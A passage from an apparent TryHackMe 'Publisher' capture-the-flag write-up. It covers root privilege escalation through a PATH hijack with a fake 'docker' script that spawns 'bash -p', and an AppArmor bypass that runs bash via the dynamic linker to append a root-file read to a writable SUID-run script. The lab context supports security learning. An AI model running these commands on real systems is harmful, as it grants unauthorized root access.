<p>We can try to look at the AppArmor profile to see if there are any restrictions that we can exploit.</p>
<p align="center"><a href="/assets/images/2-2-apparmor-profile-58b3313b6b049051808a97c7529c871d.webp" target="_blank" class="no-link"><img src="/assets/images/2-2-apparmor-profile-58b3313b6b049051808a97c7529c871d.webp" width="auto" height="auto" class="zoom-effect"></a></p>
<p>Even if we don&#x27;t have read permission on /opt/, we can still read internal files like /opt/run_container.sh.</p>
<p>Also, there is no rule that prevents us from writing to /var/tmp, so we can use this folder to write new files.</p>
<p>The script is based on docker, so if we change the PATH we can set up a new docker script to run a reverse shell.</p>
<p>The new run_container.sh will then run this custom docker binary which will allow us to get a root shell and then the last flag.</p>
<div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token builtin class-name">cd</span><span class="token plain"> /var/tmp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">touch</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">docker</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">echo</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;/bin/bash -p&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">docker</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">chmod</span><span class="token plain"> +x </span><span class="token function" style="color:#d73a49">docker</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token assign-left variable environment constant" style="color:#36acaa">PATH</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">/var/tmp:</span><span class="token environment constant" style="color:#36acaa">$PATH</span><span class="token plain"> run_container</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p align="center"><a href="/assets/images/2-3-apparmor-exploit-be61879333c9624e16b9ab575fad9b41.webp" target="_blank" class="no-link"><img src="/assets/images/2-3-apparmor-exploit-be61879333c9624e16b9ab575fad9b41.webp" width="auto" height="auto" class="zoom-effect"></a></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="method-2-exploiting-the-suid-binary-directly">Method 2: Exploiting the SUID binary directly<a class="hash-link" aria-label="Direct link to Method 2: Exploiting the SUID binary directly" title="Direct link to Method 2: Exploiting the SUID binary directly" href="/docs/writeups/thm/publisher#method-2-exploiting-the-suid-binary-directly">‚Äã</a></h3>
<p>Since run_container.sh is writable by us, we can modify it to run a reverse shell.</p>
<p>However, we need to escape the AppArmor profile by running a bash shell directly.</p>
<p>One possible solution is to run the <code>ldd</code> command to find the dynamic linker used by the binary.
Then, by calling the same linker directly, we can run bash externally and modify the script by adding the command to read the root flag.</p>
<div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ldd /opt/run_container</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/lib64/ld-linux-x86-64.so.2 /bin/bash </span><span class="token parameter variable" style="color:#36acaa">-c</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;echo &quot;cat /root/root.txt&quot; &gt;&gt; /opt/run_container.sh&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run_container</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p align="center"><a href="/assets/images/2-4-bash-append-1-e8696e2a8a01f7aaf2b54859cb475743.webp" target="_blank" class="no-link"><img src="/assets/images/2-4-bash-append-1-e8696e2a8a01f7aaf2b54859cb475743.webp" width="auto" height="auto" class="zoom-effect"></a></p>
<p align="center"><a href="/assets/images/2-5-bash-append-2-c096a665cb0507b09be7f8f0bc0979a4.webp" target="_blank" class="no-link"><img src="/assets/images/2-5-bash-append-2-c096a665cb0507b09be7f8f0bc0979a4.webp" width="auto" height="auto" class="zoom-effect"></a></p>
<p>Once done, we simply have to run the binary and get the root flag.</p>
<p align="center"><a href="/assets/images/2-6-bash-exploit-e6164ea205e3956044e95d256854901e.webp" target="_blank" class="no-link"><img src="/assets/images/2-6-bash-exploit-e6164ea205e3956044e95d256854901e.webp" width="auto" height="auto" class="zoom-effect"></a></p></div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="row margin-top--sm theme-doc-footer-edit-meta-row"><div class="col"><a href="https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/docs/writeups/thm/publisher/index.md" target="_blank" rel="noopener noreferrer" class="theme-edit-this-page"><svg fill="currentColor" height="20" width="20" viewBox="0 0 40 40" class="iconEdit_Z9Sw" aria-hidden="true"><g><path d="m34.5 11.7l-3 3.1-6.3-6.3 3.1-3q0.5-0.5 1.2-0.5t1.1 0.5l3.9 3.9q0.5 0.4 0.5 1.1t-0.5 1.2z m-29.5 17.1l18.4-18.5 6.3 6.3-18.4 18.4h-6.3v-6.2z"></path></g></svg>Edit this page</a></div><div class="col lastUpdated_JAkA"></div></div></footer></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="Docs pages"><a class="pagination-nav__link pagination-nav__link--prev" href="/docs/writeups/thm/probe"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">Probe</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/docs/writeups/thm/traverse"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">Traverse</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a class="table-of-contents__link toc-highlight" href="/docs/writeups/thm/publisher#what-is-the-user-flag">What is the user flag?</a><ul><li><a class="table-of-contents__link toc-highlight" href="/docs/writeups/thm/publisher#nmap-scan">Nmap scan</a></li><li><a class="table-of-contents__link toc-highlight" href="/docs/writeups/thm/publisher#web-server-enumeration">Web server enumeration</a></li><li><a class="table-of-contents__link toc-highlight" href="/docs/writeups/thm/publisher#searching-for-the-spip-version">Searching for the SPIP version</a></li><li><a class="table-of-contents__link toc-highlight" href="/docs/writeups/thm/publisher#exploiting-vulnerabilities-in-spip-420">Exploiting vulnerabilities in SPIP 4.2.0</a></li><li><a class="table-of-contents__link toc-highlight" href="/docs/writeups/thm/publisher#getting-the-first-flag">Getting the first flag</a></li></ul></li><li><a class="table-of-contents__link toc-highlight" href="/docs/writeups/thm/publisher#what-is-the-root-flag">What is the root flag?</a><ul><li><a class="table-of-contents__link toc-highlight" href="/docs/writeups/thm/publisher#analyzing-with-linpeas">Analyzing with LinPEAS</a></li><li><a class="table-of-contents__link toc-highlight" href="/docs/writeups/thm/publisher#method-1-exploiting-the-apparmor-profile">Method 1: Exploiting the AppArmor profile</a></li><li><a class="table-of-contents__link toc-highlight" href="/docs/writeups/thm/publisher#method-2-exploiting-the-suid-binary-directly">Method 2: Exploiting the SUID binary directly</a></li></ul></li></ul></div></div></div></div></main></div></div></div><footer class="footer footer--dark"><div class="container container-fluid"><div class="footer__bottom text--center"><div class="footer__copyright">Made with ‚ù§Ô∏è using <a href="https://docusaurus.io" target="_blank">Docusaurus</a> and <a href="https://infima.dev" target="_blank">Infima</a></div></div></div></footer></div>
</body>
</html>